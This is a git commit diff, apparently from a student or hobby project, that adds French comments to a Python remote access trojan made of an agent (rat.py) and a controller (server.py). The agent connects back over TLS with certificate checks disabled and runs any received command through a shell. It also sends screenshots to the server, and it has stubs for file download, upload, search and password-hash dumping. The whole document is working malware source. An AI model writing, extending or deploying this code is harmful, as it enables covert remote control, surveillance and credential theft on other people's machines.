b4eca9fb23c3d2b5aed411a01a924acd3d20c882
PerThoGon <enzo.marini888@gmail.com>
2024-06-12 01:07:18 +0200

    Commentaires

--- rat.py
+++ rat.py
@@ -22,16 +22,17 @@ def shell(ssl_socket):
 def ipconfig(ssl_socket):
     print('ipconfig')
 
+# Fonction permettant d'envoyer la capture d'écran au serveur
 def screenshot(ssl_socket):
-    screenshot = ImageGrab.grab()  # Capturer l'écran
+    screenshot = ImageGrab.grab()  # Capture de l'écran
     screenshot.save('screenshot.png')  # Sauvegarder la capture d'écran dans un fichier
-    with open('screenshot.png', 'rb') as screenshot_file:
+    with open('screenshot.png', 'rb') as screenshot_file: # Ouverture de la capture d'écran
         while True:
-            screenshot_to_send = screenshot_file.read(4096)
+            screenshot_to_send = screenshot_file.read(4096) # Stoakage des données de la capture d'écran
             if not screenshot_to_send:
                 break
-            ssl_socket.send(screenshot_to_send)
-    ssl_socket.send(b'END')
+            ssl_socket.send(screenshot_to_send) # Envoie de la capture d'écran
+    ssl_socket.send(b'END') # Envoie d'un délimiteur final
 
 def search(ssl_socket):
     print('search')
@@ -40,18 +41,22 @@ def hashdump(ssl_socket):
     print('hashdump')
 
 def main():
+
+    # Récupération des variables
     load_dotenv()
     ip_server = os.getenv('IP_SERVER')
 
-    # Créer un contexte SSL
+    # Création du contexte SSL pour la connexion au serveur
     context = ssl.create_default_context()
-    context.check_hostname = False
-    context.verify_mode = ssl.CERT_NONE
+    context.check_hostname = False # Désactivation de la vérification du nom d'hôte du serveur
+    context.verify_mode = ssl.CERT_NONE # Désactivation de la vérification du certificat SSL du serveur
 
+    # Création du socket TCP pour la connexion au serveur
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    ssl_socket = context.wrap_socket(client_socket, server_hostname=ip_server)
-    ssl_socket.connect((ip_server, SERVER_PORT))
+    ssl_socket = context.wrap_socket(client_socket, server_hostname=ip_server) # Enveloppement du socket avec SSL pour sécuriser la communication
+    ssl_socket.connect((ip_server, SERVER_PORT)) # Connexion au serveur en utilisant l'adresse IP et le port de connexion
 
+    # Gestion des commandes reçues pas le serveur
     while True:
         command = ssl_socket.recv(1024).decode()
         if command.lower() == 'help':
@@ -76,7 +81,7 @@ def main():
             result = subprocess.run(command, shell=True, capture_output=True, text=True)
             ssl_socket.send(result.stdout.encode() + result.stderr.encode())
 
-    ssl_socket.close()
+    ssl_socket.close() # Fermeture du socket
 
 if __name__ == "__main__":
     main()
--- server.py
+++ server.py
@@ -5,66 +5,78 @@ from dotenv import load_dotenv
 
 SERVER_PORT = 8888
 
+# Fonction permettant de récupérer la liste des commandes disponibles
 def menu_help(client_socket) :
-    client_socket.send(b'menu_help')
+    client_socket.send(b'menu_help') # Envoie de la commande
 
+# Fonction permettant de télécharger un fichier du client
 def download(client_socket) :
-    client_socket.send(b'download')
+    client_socket.send(b'download') # Envoie de la commande
 
+# Fonction permettant de charger un fichier au client
 def upload(client_socket) :
-    client_socket.send(b'upload')
+    client_socket.send(b'upload') # Envoie de la commande
 
+# Fonction permettant d'initier un shell intéractif sur le client
 def shell(client_socket) :
-    client_socket.send(b'shell')
+    client_socket.send(b'shell') # Envoie de la commande
 
+# Fonction permettant de récupérer la configuration réseau du client
 def ipconfig(client_socket) :
-    client_socket.send(b'ipconfig')
+    client_socket.send(b'ipconfig') # Envoie de la commande
 
+# Fonction permettant de récupérer la capture d'écran du client
 def screenshot(client_socket, nb_screenshot) :
-    client_socket.send(b'screenshot')
+    client_socket.send(b'screenshot') # Envoie de la commande
     screenshot_name = f'screenshot{nb_screenshot}.png'
-    with open(screenshot_name, 'wb') as screenshot:
+    with open(screenshot_name, 'wb') as screenshot: # Ouverture du fichier créé
         while True:
-            screenshot_received = client_socket.recv(4096)
-            if screenshot_received.endswith(b'END'):
-                screenshot.write(screenshot_received[:-3])
+            screenshot_received = client_socket.recv(4096) # Récupération des données de la capture d'écran
+            if screenshot_received.endswith(b'END'): # Vérification du délimiteur  final
+                screenshot.write(screenshot_received[:-3]) # Ecriture des données reçue dans le fichier ouvert sans le délimiteur
                 break
-            screenshot.write(screenshot_received)
+            screenshot.write(screenshot_received) # Ecriture des données reçue dans le fichier ouvert
     print(f'[+] {screenshot_name} reçu')
-    return nb_screenshot + 1
+    return nb_screenshot + 1 # Incrémentation du nombre de capture d'écran
 
+# Fonction permettant de chercher un fichier sur la machine du client
 def search(client_socket) :
-    client_socket.send(b'search')
+    client_socket.send(b'search') # Envoie de la commande
 
+# Fonction permettant de récupérer le fichier shadow ou la base SAM du client
 def hashdump(client_socket) :
-    client_socket.send(b'hashdump')
+    client_socket.send(b'hashdump') # Envoie de la commande
 
 
 
 def main() :
 
+    # Récupération et définition des variables
     load_dotenv()
     ip_server = os.getenv('IP_SERVER')
-
     nb_screenshot = 1
-
     cert = './cert.pem'
     key = './key.pem'
 
+    # Création du contexte SSL pour l'authentification client
     context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
     context.load_cert_chain(certfile=cert, keyfile=key)
 
+    # Création du socket TCP pour la connexion au serveur
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.bind((ip_server, SERVER_PORT))
-    server_socket.listen(1)
+    server_socket.bind((ip_server, SERVER_PORT)) # Définition de l'adresse et du port d'écoute du serveur
+    server_socket.listen(1) # Mise en écoute du socket
 
     print(f"[*] Listening on {SERVER_PORT}...")
 
-    # Envelopper le socket avec SSL
+    # Enveloppement du socket avec SSL pour sécuriser la communication
     with context.wrap_socket(server_socket, server_side=True) as ssl_socket:
+
+        # Attente d'une connexion entrante et acceptation de celle-ci
         client_socket, client_address = ssl_socket.accept()
         print("[+] Agent received !")
 
+        # Gestion des commandes envoyées au client
         while True:
             command = input("rat > Taper votre commande ici : ")
             if command.lower() == 'help':
@@ -90,8 +102,9 @@ def main() :
                 client_socket.send(command.encode())
                 result = client_socket.recv(1024).decode()
                 print(result)
-        client_socket.close()
-    server_socket.close()
+
+        client_socket.close() # Fermeture du socket client
+    server_socket.close() # Fermeture du socket serveur
 
 
 if __name__ == "__main__":
